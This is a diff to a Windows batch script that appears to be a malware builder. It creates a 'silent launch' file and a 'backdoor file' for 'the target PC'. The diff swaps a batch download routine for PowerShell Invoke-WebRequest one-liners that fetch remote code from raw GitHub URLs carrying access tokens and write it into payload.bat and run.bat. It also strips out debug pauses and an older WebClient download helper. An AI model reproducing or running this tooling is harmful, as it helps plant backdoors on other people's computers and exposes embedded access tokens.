@@ -53,34 +53,13 @@ if exist %opt2%\payload\launch.vbs (echo [92msuccessfully created silent launch
 timeout 1 /NOBREAK >nul
 :: generate a file to run code from github on the target PC
 echo [33mdownloading code from github to create backdoor file...[0m
-set dlerror=6
-Set "url=https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/BC?token=ANX5WBBBIUMXNOU5BYQRGRLAKLCX4"
-for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
-Call :Download "%url%" "%File%"
-If exist "%File%" ( 
-    ( Type "%File%")>con
-( Type "%File%" >%opt2%\payload\payload.bat)
-)
+Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/BC?token=ANX5WBBBIUMXNOU5BYQRGRLAKLCX4").Content >%opt2%\payload\payload.bat
 powershell -Command "(gc %opt2%\payload\payload.bat) -replace 'REPtxt', '%opt1%' | Out-File -encoding ASCII %opt2%\payload\payload.bat"
 if exist %opt2%\payload\payload.bat (echo [92msuccessfully created backdoor file![0m) else (goto error6)
-pause
 timeout 1 /NOBREAK >nul
-pause
 :: generate a file to move files to their proper location
 echo [33mdownloading code to deliver backdoor...[0m
-pause
-set dlerror=7
-pause
-Set "url=https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC?token=ANX5WBHRRO5XGZLFD4PQSVLAKLC2Q"
-pause
-for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
-pause
-Call :Download "%url%" "%File%"
-pause
-If exist "%File%" ( 
-    ( Type "%File%")>con
-( Type "%File%" >%opt2%\run.bat)
-)
+Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC?token=ANX5WBHRRO5XGZLFD4PQSVLAKLC2Q").Content >%opt2%\run.bat
 if exist %opt2%\run.bat (echo [92msuccessfully created run file![0m) else (goto error7)
 timeout 1 /NOBREAK >nul
 echo [33mgenerating readme file...[0m
@@ -227,16 +206,6 @@ goto emailnext
         goto error3
     )
 
-:: create update
-::web download code
-Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('%1','%2')" >error.txt
->nul find "At" error.txt && (
-  goto error%dlerror%
-) || (
-  goto cont
-)
-:cont
-exit /b
 :dev
 echo.
 title dissabled %update_number%
